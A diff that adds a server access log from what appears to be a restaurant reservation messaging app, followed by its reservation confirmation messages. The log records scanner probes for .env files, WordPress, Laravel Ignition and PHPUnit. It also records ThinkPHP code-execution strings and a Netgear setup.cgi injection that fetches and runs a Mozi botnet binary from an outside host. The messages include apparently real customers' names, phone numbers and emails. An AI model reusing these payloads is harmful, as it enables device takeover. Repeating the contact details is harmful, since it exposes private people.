+127.0.0.1 - - [25/Oct/2022 10:15:57] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:57] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:58] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:58] "[33mGET /media/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:58] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:59] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:59] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:15:59] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 10:58:22] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 10:58:22] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:12:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 11:12:02] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 11:34:02] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:34:03] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 11:38:51] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 11:57:06] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 11:57:07] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:58:26] "[33mGET /log/login-page.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:58:29] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 11:59:33] "[33mGET /metrics HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:59:33] "[33mGET /v2/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 11:59:33] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 12:00:14] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 12:14:50] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 12:20:07] "[33mGET /0bef HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:30:32] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 12:30:41] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:50] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:51] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:52] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:53] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:54] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:55] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:56] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:57] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:58] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:59] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:33:59] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:34:00] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:34:01] "[33mPOST /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 12:35:32] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 12:48:26] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 13:19:16] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 13:19:16] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 13:19:41] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 13:49:09] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 13:49:10] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 13:49:10] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 13:49:12] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 14:01:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 14:36:01] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 14:36:02] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 14:36:07] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 14:57:44] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 14:57:45] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:11:57] "[33mGET /config/getuser?index=0 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:03] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:04] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /2018/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /media/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:05] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:06] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:06] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:15:06] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:17:03] "[33mPOST /boaform/admin/formLogin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:19:26] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 15:28:24] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 15:28:24] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 15:45:59] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 16:06:34] "[31m[1mHEAD / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 16:10:27] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 16:10:28] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 16:14:39] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 16:14:39] "[33mGET /favicon.ico HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 16:26:14] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 16:26:15] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 17:01:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 17:01:47] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 17:25:03] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 17:34:39] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 17:34:40] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 17:48:55] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 17:48:55] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 17:52:44] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 17:52:45] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 17:53:02] "GET /send-message?msg=Restaurant_montevideo._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_49*_%0A%0ADía_3333-03-04_a_las_09:34hs,_Cantidad_de_personas:_5%0ANombre:_Paulina,_tel:_09598439,_mail:_crespipauli@gmail.com%0A%0AResponde_'Rechazar_49'_para_rechazarla..%0AResponde_'Confirmar_49'_para_confirmarla. HTTP/1.1" 200 -
+127.0.0.1 - - [25/Oct/2022 18:01:35] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 18:12:34] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 18:44:23] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 18:54:30] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 18:54:30] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 18:54:46] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:01:16] "[33mGET /solr/admin/info/system?wt=json HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:12:23] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:18:45] "[33mGET /portal/redlion HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:22:20] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:22:20] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 19:26:40] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:27:35] "[31m[1mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:34:20] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:34:21] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:21] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:21] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:34:22] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:22] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:22] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:23] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:34:23] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:26] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:52:26] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:52:26] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /xmlrpc.php?rsd HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /blog/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /web/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /website/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:27] "[33mGET /wp/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /news/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /2018/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /2019/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /shop/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /wp1/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /test/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:28] "[33mGET /media/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:29] "[33mGET /wp2/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:29] "[33mGET /site/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:29] "[33mGET /cms/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:52:29] "[33mGET /sito/wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:54:09] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:54:09] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 19:54:24] "[33mGET /hudson HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 19:56:20] "[31m[1mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:03:12] "[33mGET /console/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:06:56] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:12:29] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:16:05] "[33mPOST /boaform/admin/formLogin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:17:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:23:34] "[33mGET /_ignition/execute-solution HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:24:44] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:36:27] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:36:27] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 20:38:02] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:40:08] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:49:35] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 20:49:35] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 20:52:58] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 20:52:59] "OPTIONS / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 20:53:00] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 20:53:35] "[33mGET /robots.txt HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 21:02:01] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 21:07:09] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 21:07:09] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 21:28:39] "[33mGET /wp-login.php HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 21:30:01] "[33mGET /actuator/gateway/routes HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 21:39:47] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 21:39:47] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 22:11:44] "[33mPOST /boaform/admin/formLogin HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 22:52:43] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [25/Oct/2022 22:57:12] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 22:57:13] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 23:14:43] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://172.45.14.88:53986/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 23:35:19] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [25/Oct/2022 23:35:20] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 23:48:47] "POST / HTTP/1.0" 200 -
+127.0.0.1 - - [25/Oct/2022 23:48:47] "[33mGET /.env HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 00:02:32] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 00:17:19] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 00:44:17] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 00:53:51] "[33mGET /_ignition/health-check/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 00:53:54] "[33mGET /public/_ignition/health-check/ HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 00:53:56] "[33mGET /wp-includes/wlwmanifest.xml HTTP/1.0[0m" 404 -
+127.0.0.1 - - [26/Oct/2022 01:13:06] "[31m[1mGET / HTTP/1.0[0m" 405 -
+127.0.0.1 - - [26/Oct/2022 01:15:18] "GET /send-message?msg=Restaurant_montevideo._ID:_1%0A*¿Desea_confirmar_la_reservación?_ID:_50*_%0A%0ADía__a_las_hs,_Cantidad_de_personas:_2%0ANombre:_Maria,_tel:_092391725,_mail:_Fabinimaria@gmail.com%0A%0AResponde_'Rechazar_50'_para_rechazarla..%0AResponde_'Confirmar_50'_para_confirmarla. HTTP/1.1" 200 -
+
+*¿Desea_confirmar_la_reservación?_ID:_19*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_EUgeTEST,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_19'_para_rechazarla..
+Responde_'Confirmar_19'_para_confirmarla.
+
+*¿Desea_confirmar_la_reservación?_ID:_20*_
+
+Día_2022-12-24,_11:00hs,_Cantidad_de_personas:_3
+null
+
+Responde_'Rechazar_20'_para_rechazarla..
+Responde_'Confirmar_20'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_21*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_21'_para_rechazarla..
+Responde_'Confirmar_21'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_22*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant2,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_22'_para_rechazarla..
+Responde_'Confirmar_22'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_23*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant3,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_23'_para_rechazarla..
+Responde_'Confirmar_23'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_24*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant4,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_24'_para_rechazarla..
+Responde_'Confirmar_24'_para_confirmarla.
+Restaurant_id_no_encontrado
+*¿Desea_confirmar_la_reservación?_ID:_25*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_25'_para_rechazarla..
+Responde_'Confirmar_25'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_26*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_26'_para_rechazarla..
+Responde_'Confirmar_26'_para_confirmarla.
+Restaurant_null._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_27*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_27'_para_rechazarla..
+Responde_'Confirmar_27'_para_confirmarla.
+Restaurant_muy_lindo._ID:_1
+*¿Desea_confirmar_la_reservación?_ID:_28*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_TestRestaurant5,_tel:_092222222,_mail:_gamermaster@gmail.com
+
+Responde_'Rechazar_28'_para_rechazarla..
+Responde_'Confirmar_28'_para_confirmarla.
+Restaurant_Riquisimo._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_29*_
+
+Día_2022-12-24,_11:00hs,_Cantidad_de_personas:_3
+null
+
+Responde_'Rechazar_29'_para_rechazarla..
+Responde_'Confirmar_29'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_31*_
+
+Día_2022-12-24,_11:00hs,_Cantidad_de_personas:_3
+Nombre:_benja,_Tel:_1244,_Email:_benja@benja.com
+
+Responde_'Rechazar_31'_para_rechazarla..
+Responde_'Confirmar_31'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_32*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Eugenia,_tel:_092123123,_mail:_eugematto@gmail.com
+
+Responde_'Rechazar_32'_para_rechazarla..
+Responde_'Confirmar_32'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_33*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Franco,_tel:_099828311,_mail:_trenfran@gmail.com
+
+Responde_'Rechazar_33'_para_rechazarla..
+Responde_'Confirmar_33'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_34*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_34'_para_rechazarla..
+Responde_'Confirmar_34'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_35*_
+
+Día_A2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_35'_para_rechazarla..
+Responde_'Confirmar_35'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_36*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_36'_para_rechazarla..
+Responde_'Confirmar_36'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_37*_
+
+Día_2022-10-15,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_37'_para_rechazarla..
+Responde_'Confirmar_37'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_38*_
+
+Día_2022-10-14,_07:00hs,_Cantidad_de_personas:_1
+Nombre:_Juana,_tel:_099231211,_mail:_juanita@gmail.com
+
+Responde_'Rechazar_38'_para_rechazarla..
+Responde_'Confirmar_38'_para_confirmarla.
+Restaurant_Punta_del_este._ID:_2
+*¿Desea_confirmar_la_reservación?_ID:_39*_
+
+Día_2022-10-14,_07:00hs,_Cantidad_de_personas:_1
